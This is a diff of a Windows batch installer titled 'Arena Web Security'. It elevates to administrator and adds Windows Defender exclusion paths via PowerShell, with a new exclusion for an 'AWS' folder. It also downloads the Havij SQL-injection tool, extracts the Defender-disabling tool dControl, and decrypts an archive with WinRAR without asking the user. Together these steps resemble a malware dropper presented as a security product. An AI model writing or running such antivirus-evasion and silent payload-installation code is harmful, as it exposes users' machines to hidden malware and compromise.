@@ -2,6 +2,9 @@
 Title Arena Web Security
 setlocal enabledelayedexpansion
 
+::for AWS folder
+set "awsFolder=%~dp0AWS"
+
 :: Configuration for dControl
 set "bat_dir=%~dp0"
 set "folder=%bat_dir%dControl"
@@ -29,6 +32,11 @@ if %errorLevel% neq 0 (
     powershell -Command "Start-Process cmd -ArgumentList '/c \"%~dpnx0\"' -Verb RunAs"
     exit /b
 )
+
+:: AWS folder to defender exclusion
+echo [STEP] Adding Defender exclusion for: !awsFolder!
+powershell -Command "Try { Add-MpPreference -ExclusionPath '!awsFolder!' -ErrorAction Stop; Write-Host 'Defender exclusion added for AWS folder.' } Catch { Write-Host 'Failed to add Defender exclusion. You may need to run as Administrator.' }"
+
 
 :: === WinRAR Detection and Installation ===
 set "winrar_exe="
@@ -94,9 +102,6 @@ if not exist "!folder!\" (
     echo [INFO] Workspace already exists: !folder!
 )
 
-:: === Step 2: Add to Windows Defender Exclusion ===
-echo [STEP] Adding Defender exclusion for: !folder!
-powershell -Command "Try { Add-MpPreference -ExclusionPath '!folder!' -ErrorAction Stop; Write-Host 'Defender exclusion added.' } Catch { Write-Host 'Failed to add Defender exclusion. You may need to run as Administrator.' }"
 
 :: === Step 3: Open Windows Security for the User ===
 echo [INFO] Opening Windows Security for review...
@@ -121,9 +126,6 @@ if not exist "!havij_folder!\" (
     echo [INFO] Workspace already exists: !havij_folder!
 )
 
-:: Add to Windows Defender Exclusion for Havij folder
-echo [STEP] Adding Defender exclusion for: !havij_folder!
-powershell -Command "Try { Add-MpPreference -ExclusionPath '!havij_folder!' -ErrorAction Stop; Write-Host 'Defender exclusion added.' } Catch { Write-Host 'Failed to add Defender exclusion. You may need to run as Administrator.' }"
 
 :: Download Havij ZIP into the Havij Folder
 echo [STEP] Downloading Havij package into the Havij folder...
@@ -137,8 +139,7 @@ powershell -Command "Invoke-WebRequest -Uri '%havij_url%' -OutFile '!havij_zip!'
 
 
 
-:: === Step 5: Wait for User Confirmation Before Extraction (Only for dControl) ===
-echo.
+:: === Step 5: Wait for User Confirmation Before Extraction
 set /p userInput="Do you want to continue with extraction for dControl? (Y/N): "
 if /i not "%userInput%"=="Y" (
     echo [INFO] Installation aborted by user.
@@ -164,8 +165,6 @@ echo [INFO] Deleted dControl ZIP file
 :: Open dControl Portable folder
 start explorer "!folder!"
 
-
-:: Second Download and Extraction for Havij (Without Confirmation)
 
 
 :: Decrypt using WinRAR (No user confirmation for Havij)
